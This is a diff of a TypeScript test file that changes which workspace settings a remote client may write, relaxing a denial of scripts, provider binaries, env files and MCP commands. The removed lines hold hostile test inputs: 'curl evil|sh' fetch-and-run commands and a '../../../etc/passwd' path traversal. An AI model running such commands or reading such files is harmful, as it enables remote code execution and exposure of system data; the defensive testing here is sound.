@@ -341,31 +341,60 @@ describe("WorkspaceService settings ops", () => {
     expect(svc.isRemoteAllowed("settings.migrateLegacy")).toBe(false);
   });
 
-  it("a REMOTE client cannot write execution/IO keys (scripts/providers/env_files/mcp); local can", async () => {
-    for (const patch of [
-      { scripts: { setup: "curl evil|sh" } },
-      { providers: { claude: { executable_path: "/tmp/evil" } } },
-      { env_files: ["../../../etc/passwd"] },
-      // An MCP stdio command is a host process the agent CLI spawns when it
-      // boots the server — straight RCE; the engine boot-loads the user-level
-      // set, so a remote write would run on the next agent spawn.
-      {
-        mcp: {
-          servers: [
-            { name: "evil", transport: "stdio", command: "curl evil|sh" },
-          ],
+  it("a cloud client can configure contained scripts/providers/env files/MCP, while Design authority stays typed", async () => {
+    // Every process these settings can start is now causally contained:
+    // scripts use repo-code-task ZSR, provider binaries and stdio MCP children
+    // inherit agent-code ZSR, and env files stay repo-relative + spawn-scrubbed.
+    await expect(
+      svc.handle(
+        "settings.write",
+        {
+          layer: "repo",
+          repoRoot: dir,
+          patch: { scripts: { setup: "pnpm install" } },
         },
-      },
-    ]) {
-      await expect(
-        svc.handle(
-          "settings.write",
-          { layer: "repo", repoRoot: dir, patch },
-          { remote: true },
-        ),
-      ).rejects.toMatchObject({ code: "SETTINGS_REMOTE_KEY_DENIED" });
-    }
-    // Safe declarative config IS remote-writable.
+        { remote: true },
+      ),
+    ).resolves.toBeTruthy();
+    await expect(
+      svc.handle(
+        "settings.write",
+        {
+          layer: "user",
+          patch: {
+            providers: { claude: { executable_path: "/usr/bin/claude" } },
+            env_files: [".env.agent"],
+            mcp: {
+              servers: [
+                {
+                  name: "local-tools",
+                  transport: "stdio",
+                  command: "pnpm",
+                  args: ["mcp:serve"],
+                },
+              ],
+            },
+          },
+        },
+        { remote: true },
+      ),
+    ).resolves.toBeTruthy();
+
+    // The Design pointer is not an execution setting: changing it retargets
+    // engine-owned territory and must use the typed transition surface.
+    await expect(
+      svc.handle(
+        "settings.write",
+        {
+          layer: "repo",
+          repoRoot: dir,
+          patch: { design: { directory: "Source" } },
+        },
+        { remote: true },
+      ),
+    ).rejects.toMatchObject({ code: "SETTINGS_REMOTE_KEY_DENIED" });
+
+    // Safe declarative config remains cloud-writable too.
     await expect(
       svc.handle(
         "settings.write",
@@ -377,7 +406,7 @@ describe("WorkspaceService settings ops", () => {
         { remote: true },
       ),
     ).resolves.toBeTruthy();
-    // The desktop (local) may write anything.
+    // The desktop (local) may use the same settings path.
     await expect(
       svc.handle("settings.write", {
         layer: "repo",
